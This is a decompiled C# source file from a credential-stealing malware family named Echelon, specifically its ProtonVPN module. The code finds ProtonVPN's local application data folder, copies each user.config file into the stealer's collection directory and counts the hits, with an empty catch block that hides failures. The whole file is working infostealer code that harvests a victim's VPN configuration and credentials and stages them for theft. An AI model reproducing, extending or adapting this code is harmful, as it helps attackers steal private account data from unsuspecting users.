using System;
using System.IO;
using Echelon.Global;

namespace Echelon.Stealer.VPN
{
	// Token: 0x02000013 RID: 19
	internal class ProtonVPN
	{
		// Token: 0x06000030 RID: 48 RVA: 0x00003E3C File Offset: 0x0000203C
		public static void GetProtonVPN(string Echelon_Dir)
		{
			try
			{
				string text = Help.LocalData + "\\ProtonVPN";
				if (Directory.Exists(text))
				{
					string[] directories = Directory.GetDirectories(text ?? "");
					Directory.CreateDirectory(Echelon_Dir + "\\Vpn\\ProtonVPN\\");
					foreach (string text2 in directories)
					{
						if (text2.StartsWith(text + "\\ProtonVPN\\ProtonVPN.exe"))
						{
							string name = new DirectoryInfo(text2).Name;
							string[] directories2 = Directory.GetDirectories(text2);
							Directory.CreateDirectory(string.Concat(new string[]
							{
								Echelon_Dir,
								"\\Vpn\\ProtonVPN\\",
								name,
								"\\",
								new DirectoryInfo(directories2[0]).Name
							}));
							File.Copy(directories2[0] + "\\user.config", string.Concat(new string[]
							{
								Echelon_Dir,
								"\\Vpn\\ProtonVPN\\",
								name,
								"\\",
								new DirectoryInfo(directories2[0]).Name,
								"\\user.config"
							}));
							ProtonVPN.count++;
						}
					}
				}
			}
			catch
			{
			}
		}

		// Token: 0x0400002B RID: 43
		public static int count;
	}
}
